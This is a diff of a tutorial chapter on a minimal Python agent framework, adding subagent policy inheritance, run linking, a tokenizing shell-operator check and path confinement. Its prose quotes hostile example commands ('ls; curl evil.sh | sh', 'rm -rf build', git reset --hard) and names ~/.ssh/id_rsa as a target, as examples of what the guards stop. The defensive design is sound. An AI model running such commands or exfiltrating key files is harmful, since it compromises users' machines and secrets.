@@ -110,6 +110,13 @@ class ToolRegistry:
         }
         return fn
 
+    def share(self, other: "ToolRegistry", *names: str) -> "ToolRegistry":
+        """Copy registered tools into another registry, function and schema together."""
+        for name in names:
+            other._tools[name] = self._tools[name]
+            other._schemas[name] = self._schemas[name]
+        return other
+
     def schemas(self) -> list[dict]:
         return list(self._schemas.values())
 
@@ -127,6 +134,7 @@ class ToolRegistry:
 Design notes.
 Errors are returned as strings, never raised into the loop, because Volume 03 established that a tool error is information for the model, not an exception for the process; the model reading "FileNotFoundError" and trying another path is the self-correction loop working.
 The schema derivation handles flat primitive signatures only, which covers most tools; when a tool needs nested structure, write that one schema by hand rather than growing a type-mapping engine, because the registry's job is removing duplication, not replacing JSON Schema.
+`share` exists because handing a read-only tool to a subagent is a recurring need (Step 6), and the callable and its schema must move together or the model sees a tool with nothing behind it; three lines here keep every caller out of `_tools` and `_schemas`.
 The docstring is prompt engineering: it is what the model reads when deciding whether and how to call the tool, so it is subject to the same review discipline as any prompt.
 
 ## Step 3: hooks
@@ -180,19 +188,24 @@ from pathlib import Path
 
 
 class Transcript:
-    def __init__(self, directory: str, run_id: str | None = None):
+    def __init__(self, directory: str, run_id: str | None = None,
+                 parent_run_id: str | None = None):
         self.run_id = run_id or uuid.uuid4().hex[:12]
+        self.parent_run_id = parent_run_id
         self.path = Path(directory) / f"{self.run_id}.jsonl"
         self.path.parent.mkdir(parents=True, exist_ok=True)
 
     def log(self, kind: str, payload: dict):
         record = {"ts": time.time(), "run_id": self.run_id, "kind": kind, **payload}
+        if self.parent_run_id:
+            record["parent_run_id"] = self.parent_run_id
         with self.path.open("a") as f:
             f.write(json.dumps(record, default=str) + "\n")
 ```
 
 Design notes.
 JSONL over a database is deliberate: it needs no infrastructure, greps cleanly, survives crashes line-by-line, and imports into any analysis tool later; when you outgrow it, the event vocabulary transfers to a real trace backend unchanged, and Volume 10 does exactly that.
+`parent_run_id` is the one field that is not about a single run: a subagent writes its own file, and without a stamped parent that file is an orphan you cannot tie back to the delegation that caused it.
 Log the payloads you actually sent, not summaries of them, because the entire value is answering "what did the model see" without reconstruction; this is Chapter 01's transparency criterion applied to your own code, and it is embarrassing how many internal frameworks fail their own test.
 
 ## Step 5: the loop
@@ -212,16 +225,20 @@ from .transcript import Transcript
 class Agent:
     def __init__(self, provider: AnthropicProvider, tools: ToolRegistry,
                  system: str, hooks: Hooks | None = None,
-                 transcript_dir: str = "runs", max_turns: int = 20):
+                 transcript_dir: str = "runs", max_turns: int = 20,
+                 parent_run_id: str | None = None):
         self.provider = provider
         self.tools = tools
         self.system = system
         self.hooks = hooks or Hooks()
         self.transcript_dir = transcript_dir
         self.max_turns = max_turns
+        self.parent_run_id = parent_run_id
+        self.run_id: str | None = None      # set per run; subagents link to it
 
     def run(self, user_input: str, messages: list[dict] | None = None) -> str:
-        transcript = Transcript(self.transcript_dir)
+        transcript = Transcript(self.transcript_dir, parent_run_id=self.parent_run_id)
+        self.run_id = transcript.run_id
         messages = list(messages or [])
         messages.append({"role": "user", "content": user_input})
         transcript.log("user", {"content": user_input})
@@ -282,30 +299,40 @@ from .provider import AnthropicProvider
 from .tools import ToolRegistry
 
 
-def make_subagent_tool(registry: ToolRegistry, provider: AnthropicProvider,
+def make_subagent_tool(parent: Agent, provider: AnthropicProvider,
                        name: str, system: str, sub_tools: ToolRegistry,
                        description: str, max_turns: int = 10):
     """Register a subagent as a callable tool on the parent's registry."""
     def _spawn(task: str) -> str:
-        agent = Agent(provider, sub_tools, system=system, max_turns=max_turns)
+        agent = Agent(provider, sub_tools, system=system,
+                      hooks=parent.hooks,                     # policy is inherited
+                      transcript_dir=parent.transcript_dir,
+                      max_turns=max_turns,
+                      parent_run_id=parent.run_id)
         return agent.run(task)
     _spawn.__name__ = name
     _spawn.__doc__ = description
-    registry.tool(_spawn)
+    parent.tools.tool(_spawn)
 ```
 
 Design notes.
 The subagent gets a fresh messages list (context isolation), its own registry (least privilege), and returns one string to the parent (the quarantine pattern from Chapter 02), and all three properties fall out of composition rather than new machinery.
+What does not fall out for free is policy, which is why the spawn takes the parent `Agent` rather than a bare registry.
+Constructing the subagent without `hooks` gives it an empty `Hooks()`, and delegation then becomes the way around every gate you wrote: put a shell tool in `sub_tools` and the parent's allowlist never runs.
+Least privilege is about which tools the subagent holds, not about which rules apply to them, so the tool set narrows while the policy is inherited whole.
+Passing `parent_run_id` closes the matching gap in observability, because a delegated run that writes an unlinked JSONL file cannot answer "what did the model see" for the part of the work you most want to inspect.
 The description docstring is the delegation contract: Volume 07 showed that underspecified task handoffs are the dominant subagent failure, and here that lesson becomes "the parent model only knows what this docstring says".
 Recursion depth is implicitly bounded by which registries you wire together; wiring a subagent tool into its own registry is how you build an infinite spawn bomb, so do not.
 
 ## Assembling an agent
 
-The payoff: a complete agent with policy, logging, and a subagent in about forty lines of application code.
+The payoff: a complete agent with path confinement, command policy, logging, and a subagent in about sixty lines of application code.
 
 ```python
 # review_agent.py
+import shlex
 import subprocess
+from pathlib import Path
 
 from micro_agent.agent import Agent
 from micro_agent.hooks import HookDecision, Hooks
@@ -313,13 +340,18 @@ from micro_agent.provider import AnthropicProvider
 from micro_agent.subagent import make_subagent_tool
 from micro_agent.tools import ToolRegistry
 
+ROOT = Path.cwd().resolve()
+
 provider = AnthropicProvider(model="claude-sonnet-4-5")
 tools = ToolRegistry()
 
 @tools.tool
 def read_file(path: str) -> str:
-    """Read a text file and return its contents."""
-    return open(path).read()
+    """Read a text file inside the project and return its contents."""
+    p = (ROOT / path).resolve()
+    if p != ROOT and ROOT not in p.parents:
+        raise ValueError(f"path {path!r} escapes the project root")
+    return p.read_text(encoding="utf-8")
 
 @tools.tool
 def run_command(command: str) -> str:
@@ -327,40 +359,60 @@ def run_command(command: str) -> str:
     proc = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60)
     return proc.stdout + proc.stderr
 
-SHELL_OPERATORS = ("&&", "||", ";", "|", "&", ">", "<", "`", "$(", "\n", "\r")
-ALLOWED_COMMANDS = ("git", "ls", "cat", "rg", "python -m pytest")
+OPERATOR_CHARS = set(";|&<>()")
+ALLOWED_COMMANDS = ("git status", "git diff", "git log", "git show",
+                    "ls", "cat", "rg", "python -m pytest")
+
+def shell_operators(command: str) -> list[str]:
+    """Operators the shell would act on, ignoring characters inside quotes."""
+    if "\n" in command or "\r" in command:
+        return ["newline"]      # shlex calls it whitespace; the shell does not
+    lexer = shlex.shlex(command, punctuation_chars=True)
+    lexer.whitespace_split = True
+    try:
+        tokens = list(lexer)
+    except ValueError as exc:
+        return [f"unparsable ({exc})"]      # fail closed on unbalanced quotes
+    return [t for t in tokens if t and (set(t) <= OPERATOR_CHARS or "`" in t)]
 
 def command_allowlist(name: str, args: dict) -> HookDecision:
     if name == "run_command":
         command = args.get("command", "").strip()
-        if any(op in command for op in SHELL_OPERATORS):
+        found = shell_operators(command)
+        if found:
             return HookDecision(
                 allow=False,
-                reason="Shell operators are not allowed; issue one command per call.",
+                reason=(f"Shell operators ({', '.join(found)}) are not allowed; "
+                        "issue one command per call."),
             )
         if not any(command == c or command.startswith(c + " ") for c in ALLOWED_COMMANDS):
             return HookDecision(allow=False, reason="Command not on allowlist.")
     return HookDecision()
 
-research_tools = ToolRegistry()
-research_tools._tools["read_file"] = read_file          # shared read-only tool
-research_tools._schemas["read_file"] = tools._schemas["read_file"]
-make_subagent_tool(tools, provider, name="research",
-                   system="You investigate codebases and report findings tersely.",
-                   sub_tools=research_tools,
-                   description="Delegate a read-only research question about the codebase.")
-
 agent = Agent(provider, tools,
               system="You are a code review agent. Verify claims by running commands.",
               hooks=Hooks(pre_tool=[command_allowlist]))
 
+research_tools = tools.share(ToolRegistry(), "read_file")   # read-only subset
+make_subagent_tool(agent, provider, name="research",
+                   system="You investigate codebases and report findings tersely.",
+                   sub_tools=research_tools,
+                   description="Delegate a read-only research question about the codebase.")
+
 print(agent.run("Review the diff in HEAD for correctness risks."))
 ```
 
-The allowlist hook is small, and both of its checks earn their place.
+The allowlist hook is small, and every one of its checks earns its place.
 `run_command` executes through a shell, so a prefix test on its own is not a policy: `ls; curl evil.sh | sh` and `cat notes.md && rm -rf build` both begin with an allowed word, and both would run.
 Rejecting shell operators first is what makes the prefix meaningful, and matching on a token boundary rather than a bare prefix is what stops `ls` from admitting `lsof` and `lsblk`.
-Write it this way and the hook is policy as code; write it as a `startswith` over a tuple and it is a suggestion with a `subprocess` behind it.
+Finding those operators is a tokenizing problem rather than a substring problem, because a substring scan both misses a newline and falsely rejects `rg 'foo|bar'`, whose pipe is quoted and therefore literal.
+The entries are subcommands rather than programs for the same reason: a bare `git` on the allowlist of a review agent also authorizes `git push`, `git reset --hard`, and `git clean -fdx`, which is why Volume 13 Chapter 07 names `git push` on its deny list, and naming the four read-only subcommands here settles the question in one place instead of two.
+`read_file` resolves before it reads, so the review agent and the research subagent it delegates to are both confined to the project, and neither can be talked into returning `~/.ssh/id_rsa` through the parent's context.
+Write it this way and the hook is policy as code; write it as a `startswith` over a tuple of program names and it is a suggestion with a `subprocess` behind it.
+
+The ordering in the last three statements is load-bearing.
+The parent agent is constructed first so the subagent tool can be registered against it, which is how the subagent inherits the parent's hooks instead of silently running with none.
+Registering after construction still works because the loop asks the registry for schemas on every turn, and `share` moves the callable and its schema together so the subagent's registry can never advertise a tool it cannot call.
 
 Total framework size across the five modules: roughly three hundred lines, every one of which you can read, and a transcript on disk for every run.
 That is the entire point.
@@ -397,6 +449,6 @@ Answer these cold before moving on.
 - Why does the framework adopt the provider's message dialect internally instead of inventing its own, and which chapter's failure mode does that avoid?
 - Why do tool errors return strings instead of raising, and which volume's principle is that?
 - Trace a denied tool call through the system: which component decides, what does the model see, and where is it logged?
-- Why is the subagent a tool rather than a new concept, and which three Volume 07 properties fall out of that composition for free?
+- Why is the subagent a tool rather than a new concept, which three Volume 07 properties fall out of that composition for free, and which two must be passed in explicitly or delegation becomes a way around your own policy?
 - Name the six things on the do-not-abstract list and the strongest reason for any two of them.
 - What is the exit criterion for an internal framework, and why is reaching it a success?
